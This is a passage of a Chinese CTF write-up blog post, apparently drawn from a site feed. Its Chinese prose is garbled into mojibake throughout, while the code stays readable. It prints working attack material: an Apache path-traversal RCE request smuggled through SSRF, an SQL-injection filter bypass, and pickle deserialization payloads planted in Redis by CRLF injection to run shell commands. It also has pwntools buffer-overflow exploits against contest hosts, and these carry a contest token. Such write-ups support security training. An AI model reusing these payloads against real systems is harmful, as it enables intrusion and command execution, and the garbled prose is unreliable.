åšå®¢</span><br>æ‰€ä»¥æ ¹æ® python çš„æºç ï¼Œæ„é€ å¦‚ä¸‹çš„åŒ…ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">POST /nc HTTP/2</span><br><span class="line">Host: prob01-8k743yxw.contest.pku.edu.cn</span><br><span class="line">Content-Length: 470</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line">Content-Disposition: form-data; name=&quot;port&quot;</span><br><span class="line"></span><br><span class="line">80</span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW</span><br><span class="line">Content-Disposition: form-data; name=&quot;data&quot;</span><br><span class="line"></span><br><span class="line">POST /cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh HTTP/1.1</span><br><span class="line">Host: aaaa</span><br><span class="line">User-Agent: curl/7.68.0</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Length: 45</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">echo Content-Type:text/plain; echo; cat /flag;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundary7MA4YWxkTrZu0gW--</span><br></pre></td></tr></table></figure><p>é€šè¿‡ burp å‘åŒ…å¾—åˆ° flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;wHaTaaPaCheRcE&#125;</span><br></pre></td></tr></table></figure><h2 id="web-phpsql"><a class="markdownIt-Anchor" href="#web-phpsql">#</a> Web-phpsql</h2><p>é¢˜ç›®å¼€å§‹æ˜¯ä¸ªç™»é™†æ¡†ï¼Œæ ¹æ®é¢˜ç›®ï¼Œåº”è¯¥æ˜¯ä¸ª sql æ³¨å…¥ï¼Œå…ˆæ³¨å†Œè´¦å·ï¼Œç„¶åç™»é™†æ³¨å†Œçš„è´¦å·çœ‹çœ‹æƒ…å†µï¼Œå‡ºç°ä¸€ä¸ªå¼¹çª—ï¼Œè¡¨ç¤ºåªæœ‰ admin æ‰èƒ½æ‹¿åˆ°ä¸€äº›å†…å®¹ï¼Œé‚£ä¹ˆçŒœæµ‹åº”è¯¥æ˜¯ä¸‡èƒ½å¯†ç ç™»é™† admin è´¦å·ã€‚<br><img data-src="https://img-blog.csdnimg.cn/img_convert/2f4ae7a99b08a15aa92c69ac1f4e3e9b.png" alt="image.png"><br> å½“ payload ä¸º  1â€™ or 1=1 #  çš„æ—¶å€™ï¼Œå›æ˜¾æ˜¯ hackerï¼Œå¤šæ¬¡å°è¯•ä¹‹åï¼Œå‘ç°åªè¿‡æ»¤äº†ç©ºæ ¼ï¼Œå†…è”æ³¨é‡Šç»•è¿‡ï¼Œæ„é€  payload ä¸ºï¼š1â€™/<strong>/Or/</strong>/1/<strong>/like/</strong>/1/**/# æˆåŠŸç»•è¿‡ï¼Œåœ¨ç»è¿‡ä¸¤æ¬¡ç¦»è°±çš„å¼¹çª—ä¹‹åï¼ŒæˆåŠŸæ‹¿åˆ° flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;KTFoYJlPMrqDW6fBGwGG&#125;</span><br></pre></td></tr></table></figure><h2 id="web-pyssrfå¤ç°"><a class="markdownIt-Anchor" href="#web-pyssrfå¤ç°">#</a> Web-pyssrfï¼ˆå¤ç°ï¼‰</h2><p>è®¿é—® source è·¯ç”±ï¼Œæ‹¿åˆ° python æºç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,request</span><br><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> Redis</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">redis = Redis(host=<span class="string">&#x27;127.0.0.1&#x27;</span>, port=<span class="number">6379</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_result</span>(<span class="params">url</span>):</span><br><span class="line">    url_key=hashlib.md5(url.encode()).hexdigest()</span><br><span class="line">    res=redis.get(url_key)</span><br><span class="line">    <span class="keyword">if</span> res:</span><br><span class="line">        <span class="keyword">return</span> pickle.loads(base64.b64decode(res))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="built_in">print</span>(url)</span><br><span class="line">            info = urllib.request.urlopen(url)</span><br><span class="line">            res = info.read()</span><br><span class="line">            pickres=pickle.dumps(res)</span><br><span class="line">            b64res=base64.b64encode(pickres)</span><br><span class="line">            redis.<span class="built_in">set</span>(url_key,b64res,ex=<span class="number">300</span>)</span><br><span class="line">            <span class="keyword">return</span> res</span><br><span class="line">        <span class="keyword">except</span> urllib.error.URLError <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(e)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello</span>():</span><br><span class="line">    url = request.args.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;&lt;h1&gt;give me your url via GET method like: ?url=127.0.0.1:8080&lt;h1&gt;</span></span><br><span class="line"><span class="string">    &lt;h2&gt;Here is your result&lt;/h2&gt;</span></span><br><span class="line"><span class="string">    &lt;h3&gt;source code in /source&lt;/h3&gt;</span></span><br><span class="line"><span class="string">    %s</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span> % get_result(<span class="string">&#x27;http://&#x27;</span>+url).decode(encoding=<span class="string">&#x27;utf8&#x27;</span>,errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/source&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">source</span>():</span><br><span class="line">    <span class="keyword">return</span></span><br></pre></td></tr></table></figure><p>çœ‹ä¸Šå»æ˜¯ä¸€ä¸ª pickle ååºåˆ—åŒ–åŠ ä¸Š ssrf çš„æ´ï¼Œå…·ä½“å•¥åŸç†è¿˜ä¸æ˜¯å¾ˆæ‡‚ï¼Œå…ˆå†™ä¸‹å‚è€ƒåœ°å€ï¼šæ¼æ´æ˜¯å« CRLF ç¼–å·ä¸º CVE 2019-9947ï¼Œå‚è€ƒèµ„æ–™å¯ä»¥æ˜¯<br><span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpcnU5OTcyL2FydGljbGUvZGV0YWlscy8xMjgzNDM2NzY="> Python urllib CRLF æ³¨å…¥æ¼æ´å°ç»“_urllib crlf æ¼æ´ - CSDN åšå®¢</span><br>é¦–å…ˆæ˜¯æ„é€  key å€¼ï¼š<br>md5(â€˜<span class="exturl" data-url="aHR0cDovLzE=">http://1</span>â€™)=22d474190b1889d3373fa4f9334e979c<br>** ç”¨è„šæœ¬æ„é€  pickle çš„ååºåˆ—æ•°æ® ** :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64 </span><br><span class="line">a=<span class="string">b&#x27;&#x27;&#x27;cos system</span></span><br><span class="line"><span class="string">(S&#x27;command here&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a))</span><br></pre></td></tr></table></figure><p>å› ä¸ºé‡‡ç”¨çš„æ˜¯ flask æ¡†æ¶ï¼Œæœ€ç®€å•è·å¾—å›æ˜¾çš„æ–¹å¼å°±æ˜¯å†™æ–‡ä»¶åˆ°é™æ€ç›®å½•</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;mkdir static&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a))</span><br></pre></td></tr></table></figure><p>å†å°† flag çš„å†…å®¹é‡å®šå‘åˆ° static/1.txt ä¸­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">a=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&#x27;cat /flag&gt;static/1.txt&#x27;</span></span><br><span class="line"><span class="string">tR.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(a))</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥ï¼Œpayload ä¾æ¬¡ä¸ºï¼š<br>å†™å…¥ redis å†…ç¼“å­˜ï¼Œåˆ›å»ºé™æ€ç›®å½• static</p><blockquote><p>/?url=127.0.0.1:6379?%0d%0a%0d%0aSET%2022d474190b1889d3373fa4f9334e979c%20%22Y29zCnN5c3RlbQooUydta2Rp<br>ciBzdGF0aWMnCnRSLg%3d%3d%22%0d%0apaddins</p></blockquote><p>ç¼“å­˜ä¹‹åè§¦å‘ååºåˆ—åŒ–ï¼š</p><blockquote><p>/?url=1</p></blockquote><p>è¯»å– flagï¼Œå¹¶é‡å®šå‘åˆ° /static/1.txt å†…ï¼š</p><blockquote><p>/?url=127.0.0.1:6379?%0d%0a%0d%0aSET%2022d474190b1889d3373fa4f9334e979c%20%22Y29zCnN5c3RlbQooUydjYXQg<br>L2ZsYWc%2bc3RhdGljLzEudHh0Jwp0Ui4%3d%22%0d%0apaddins</p></blockquote><p>ç¼“å­˜ä¹‹åè§¦å‘ååºåˆ—åŒ–ï¼š</p><blockquote><p>/?url=1</p></blockquote><p>ä¹‹åè®¿é—® /static/1.txt æ‹¿åˆ° flagï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;qtRqiLrtTp6hoN2RPMti&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn-babypwn"><a class="markdownIt-Anchor" href="#pwn-babypwn">#</a> Pwn-babypwn</h2><p>ï¼ˆè¿™ä¸ªé¢˜ä¸çŸ¥ä¸ºå•¥ï¼Œæœ‰ç§è«åå¥‡å¦™çš„æ„Ÿè§‰ï¼Œæœ¬åœ°æ— è®ºå‡ æ¬¡éƒ½ä¸åŒï¼Œè¿œç¨‹å°±èƒ½é€šï¼‰<br>æŸ¥çœ‹å¼€å¯çš„ä¿æŠ¤ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@g01den-virtual-machine:/mnt/shared<span class="comment"># checksec pwn</span></span><br><span class="line">[*] <span class="string">&#x27;/mnt/shared/pwn&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX unknown - GNU_STACK missing</span><br><span class="line">    PIE:      No <span class="title function_ invoke__">PIE</span> (<span class="number">0x400000</span>)</span><br><span class="line">    Stack:    Executable</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure><p>åç¼–è¯‘ä¹‹åï¼Œæ‰¾åˆ°æ¼æ´å‡½æ•° login ()ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_ invoke__">login</span>()</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  char buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  char s1[<span class="number">40</span>]; <span class="comment">// [rsp+20h] [rbp-30h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Enter your username: &quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">read</span>(<span class="number">0</span>, buf, <span class="number">0</span>x40uLL);</span><br><span class="line">  <span class="title function_ invoke__">printf</span>(<span class="string">&quot;Enter the password: &quot;</span>);</span><br><span class="line">  <span class="title function_ invoke__">read</span>(<span class="number">0</span>, s1, <span class="number">0</span>x40uLL);</span><br><span class="line">  v0 = <span class="title function_ invoke__">strcmp</span>(buf, <span class="string">&quot;root&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v0 | (unsigned <span class="keyword">int</span>)<span class="title function_ invoke__">strcmp</span>(s1, <span class="string">&quot;!@#$%^&amp;*()_+&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¹¶ä¸”ï¼Œå­˜åœ¨åé—¨å‡½æ•° sub_401176ï¼Œåœ°å€ä¸º 0x401176ï¼Œæ‰€ä»¥ï¼Œæ ¹æ® gdb è°ƒè¯•ï¼Œå¾—çŸ¥ç¼“å†²åŒºåŠ ä¸Š ebp çš„å¤§å°ä¸º 120 å­—èŠ‚ï¼Œæ‰€ä»¥ exp å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line"><span class="comment">#io = process(&quot;./pwn&quot;)</span></span><br><span class="line">io = <span class="title function_ invoke__">remote</span>(<span class="string">&#x27;prob07.contest.pku.edu.cn&#x27;</span>,<span class="number">10007</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">backdoor = <span class="number">0x40117a</span>  <span class="comment">#ä¸çŸ¥é“ä¸ºå•¥ï¼Œè¿™é‡Œå¦‚æœæ˜¯0x401176çš„è¯ï¼Œæ‰“ä¸é€š</span></span><br><span class="line">token = b<span class="string">&quot;502:MEUCIQCSKqRJcp-PqKLApv7lBRVleK1e5RKveCEC5QmjJ0OONQIgRVfKZtoZoiGXf4sDyUDuFG0Uf0DLCPGdYFAkCEYMvw4=&quot;</span></span><br><span class="line">io.<span class="title function_ invoke__">sendline</span>(token)</span><br><span class="line">io.<span class="title function_ invoke__">recvuntil</span>(b<span class="string">&#x27;Enter your username: &#x27;</span>)</span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span>*<span class="number">120</span> + <span class="title function_ invoke__">p64</span>(backdoor)</span><br><span class="line">io.<span class="title function_ invoke__">sendline</span>(payload)</span><br><span class="line">io.<span class="title function_ invoke__">recv</span>()</span><br><span class="line">io.<span class="title function_ invoke__">interactive</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æœ€å flag ä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;kooD1EijiemeePh8ieNei2Xol8ich5DE&#125;</span><br></pre></td></tr></table></figure><h2 id="pwn-login"><a class="markdownIt-Anchor" href="#pwn-login">#</a> Pwn-Login</h2><p>æ²¡æœ‰é™„ä»¶ nc è¿ä¸Šå¤šæµ‹è¯•å‡ æ¬¡å°±ä¼šçŸ¥é“ password å¤šè¾“å‡ ä¸ªå­—ç¬¦å°±ä¼šè¾“å‡ºäºŒè¿›åˆ¶æ–‡ä»¶<br><img data-src="https://img-blog.csdnimg.cn/img_convert/bb9e55ffa5a970fe87d400ae5ee87bd1.png" alt="å›¾ç‰‡.png"> å¤šè¯•è¯• 0x28 ä¸ªå­—ç¬¦æ—¶èƒ½æ¥æ”¶åˆ°æ­£ç¡®çš„æ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;prob04.contest.pku.edu.cn&quot;</span>, <span class="number">10004</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;token: &quot;</span>, <span class="string">b&#x27;502:MEUCIQCSKqRJcp-PqKLApv7lBRVleK1e5RKveCEC5QmjJ0OONQIgRVfKZtoZoiGXf4sDyUDuFG0Uf0DLCPGdYFAkCEYMvw4=&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Username&#x27;</span>, <span class="string">&quot;admin\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Password&#x27;</span>, <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x28</span>))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;dumped\n&#x27;</span>)</span><br><span class="line">key = io.recvall()</span><br><span class="line"></span><br><span class="line">fp = <span class="built_in">open</span>(<span class="string">&#x27;att&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">fp.write(key)</span><br><span class="line"></span><br><span class="line">os.system(<span class="string">&#x27;chmod 777 att&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyNC9wZGYvMzUzNTE0ODEvMTcxNTA4MjI5NzAzNC0zNWYzMDZjZC01MGIxLTQ1NWYtYjZjMS1jYjdjZmM2ZmMxMjEucGRmP19sYWtlX2NhcmQ9JTdCJTIyc3JjJTIyJTNBJTIyaHR0cHMlM0ElMkYlMkZ3d3cueXVxdWUuY29tJTJGYXR0YWNobWVudHMlMkZ5dXF1ZSUyRjAlMkYyMDI0JTJGcGRmJTJGMzUzNTE0ODElMkYxNzE1MDgyMjk3MDM0LTM1ZjMwNmNkLTUwYjEtNDU1Zi1iNmMxLWNiN2NmYzZmYzEyMS5wZGYlMjIlMkMlMjJuYW1lJTIyJTNBJTIyYXR0LnBkZiUyMiUyQyUyMnNpemUlMjIlM0ExNjcwNCUyQyUyMmV4dCUyMiUzQSUyMnBkZiUyMiUyQyUyMnNvdXJjZSUyMiUzQSUyMiUyMiUyQyUyMnN0YXR1cyUyMiUzQSUyMmRvbmUlMjIlMkMlMjJkb3dubG9hZCUyMiUzQXRydWUlMkMlMjJ0YXNrSWQlMjIlM0ElMjJ1ZjRiNWYzZjItNmFlZS00NWM1LTlkNmQtYzkwYTY2MDMyNWYlMjIlMkMlMjJ0YXNrVHlwZSUyMiUzQSUyMnVwbG9hZCUyMiUyQyUyMnR5cGUlMjIlM0ElMjJhcHBsaWNhdGlvbiUyRnBkZiUyMiUyQyUyMl9fc3BhY2luZyUyMiUzQSUyMmJvdGglMjIlMkMlMjJtb2RlJTIyJTNBJTIydGl0bGUlMjIlMkMlMjJpZCUyMiUzQSUyMnUwNTU2MTEzZiUyMiUyQyUyMm1hcmdpbiUyMiUzQSU3QiUyMnRvcCUyMiUzQXRydWUlMkMlMjJib3R0b20lMjIlM0F0cnVlJTdEJTJDJTIyY2FyZCUyMiUzQSUyMmZpbGUlMjIlN0Q=">att.pdf</span>(zip)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">login</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s1[<span class="number">48</span>]; <span class="comment">// [rsp+0h] [rbp-90h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">95</span>]; <span class="comment">// [rsp+30h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int8 v3; <span class="comment">// [rsp+8Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x50</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(s1, <span class="number">0</span>, <span class="number">0x28</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Username: &quot;</span>);</span><br><span class="line">  fgets(s, <span class="number">80</span>, <span class="built_in">stdin</span>);</span><br><span class="line">  <span class="keyword">if</span> ( s[<span class="number">0x14</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Username too long&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Password: &quot;</span>);</span><br><span class="line">    fgets(s1, <span class="number">0x320</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s, <span class="string">&quot;admin\n&quot;</span>) &amp;&amp; !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;1q2w3e4r\n&quot;</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Login successful, welcome admin&quot;</span>);</span><br><span class="line">      v3 = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Login failed&quot;</span>);</span><br><span class="line">      v3 = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( s1[<span class="number">0x28</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Stack smashing detected&quot;</span>);</span><br><span class="line">      overflow_detected = <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">return</span> v3;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æº¢å‡ºï¼Œè¿”å›åˆ°åé—¨å‡½æ•°<br> exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">&quot;prob04.contest.pku.edu.cn&quot;</span>, <span class="number">10004</span>)</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">&quot;token: &quot;</span>, <span class="string">b&#x27;502:MEUCIQCSKqRJcp-PqKLApv7lBRVleK1e5RKveCEC5QmjJ0OONQIgRVfKZtoZoiGXf4sDyUDuFG0Uf0DLCPGdYFAkCEYMvw4=&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;1q2w3e4r&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x98</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p64(<span class="number">0x40127e</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Username&#x27;</span>, <span class="string">&quot;admin\x00&quot;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">&quot;Password&quot;</span>, payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;loGiN_SuccESs_cOnGratUlatION&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTFerçš„æ¯”èµ›ä¹‹è·¯ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ— å‚æ•°RCEçš„ä¸€äº›å¥‡æŠ€æ·«å·§</title>
      <link href="/posts/88915f6f.html"/>
      <url>/posts/88915f6f.html</url>
      
